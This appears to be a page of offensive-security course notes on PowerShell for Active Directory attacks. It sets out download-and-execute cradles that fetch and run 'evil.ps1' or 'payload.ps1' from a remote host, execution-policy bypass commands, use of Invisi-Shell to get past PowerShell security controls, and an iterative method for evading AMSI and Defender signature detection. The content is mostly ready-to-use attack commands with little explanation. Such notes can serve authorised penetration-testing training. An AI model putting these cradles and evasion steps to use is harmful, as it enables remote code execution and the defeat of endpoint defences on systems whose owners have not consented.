# PowerShell

## <mark style="color:red;">PowerShell Scripts and Modules</mark>

Load a PowerShell script using dot sourcing

```powershell
. C:\AD\Tools\PowerView.ps1
```

A module (or a script) can be imported with:

```powershell
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
```

All the commands in a module can be listed with:

```powershell
Get-Command -Module <modulename>
```

## <mark style="color:red;">PowerShell Script Execution</mark>

Download execute cradle

<pre class="language-powershell"><code class="lang-powershell">iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

<strong>#PSv3 onwards
</strong><strong>iex (iwr 'http://192.168.230.1/evil.ps1')
</strong>
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText

$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
</code></pre>

## <mark style="color:red;">Execution Policy</mark>

It is NOT a security measure, it is present to prevent user from accidently executing scripts.

Several ways to bypass:

```powershell
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

## <mark style="color:red;">Bypassing PowerShell Security</mark>

We will use Invisi-Shell for bypassing the security controls in PowerShell.

{% embed url="https://github.com/OmerYa/Invisi-Shell" %}
Invisi-Shell
{% endembed %}

Using Invisi-Shell:

* With admin privileges:

```powershell
RunWithPathAsAdmin.bat
```

* With non-admin privileges:

```powershell
RunWithRegistryNonAdmin.bat
```

Type exit from the new PowerShell session to complete the clean-up.

## Bypassing AV Signatures for PowerShell

Steps to avoid signature based detection are pretty simple:

1. Scan using AMSITrigger ([https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)) and DefenderCheck (https://github.com/t3hbb/DefenderCheck):
   1. Simply provide path to the script file to scan it: `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1`
   2. For full obfuscation of PowerShell scripts, see Invoke-Obfuscation (https://github.com/danielbohannon/InvokeObfuscation). That is used for obfuscating the AMSI bypass in the course!
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat the steps 2 & 3 till we get a result as “AMSI\_RESULT\_NOT\_DETECTED” or “Blank”
